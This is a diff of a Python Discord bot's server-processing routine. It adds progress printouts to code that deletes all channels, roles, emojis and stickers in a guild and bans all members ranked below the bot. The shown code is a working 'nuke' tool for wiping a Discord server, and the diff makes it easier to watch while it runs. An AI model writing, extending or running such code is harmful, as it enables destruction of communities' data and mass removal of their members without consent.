@@ -23,7 +23,9 @@ async def process_guild(guild):
     if bot_member.guild_permissions.manage_channels:
         for channel in guild.channels:
             try:
+                print(f"Deleting {channel.name}...")
                 await channel.delete()
+                print(f"Deleted {channel.name}.")
             except Exception as e:
                 print(f"Failed to delete {channel.name}: {e}")
     else:
@@ -34,7 +36,9 @@ async def process_guild(guild):
             try:
                 if member.top_role.position < bot_member.top_role.position:
                     try:
+                        print(f"Banning {member.name}...")
                         await member.ban()
+                        print(f"Banned {member.name}.")
                     except Exception as e:
                         print(f"Failed to ban {member.name}: {e}")
                 else:
@@ -49,7 +53,9 @@ async def process_guild(guild):
             try:
                 if role.position < bot_member.top_role.position:
                     try:
+                        print(f"Deleting role {role.name}...")
                         await role.delete()
+                        print(f"Deleted role {role.name}.")
                     except Exception as e:
                         print(f"Failed to delete role {role.name}: {e}")
                 else:
@@ -62,12 +68,16 @@ async def process_guild(guild):
     if bot_member.guild_permissions.manage_emojis_and_stickers:
         for emoji in guild.emojis:
             try:
+                print(f"Deleting emoji {emoji.name}...")
                 await emoji.delete()
+                print(f"Deleted emoji {emoji.name}.")
             except Exception as e:
                 print(f"Failed to delete emoji {emoji.name}: {e}")
         for sticker in guild.stickers:
             try:
+                print(f"Deleting sticker {sticker.name}...")
                 await sticker.delete()
+                print(f"Deleted sticker {sticker.name}.")
             except Exception as e:
                 print(f"Failed to delete sticker {sticker.name}: {e}")
     else:
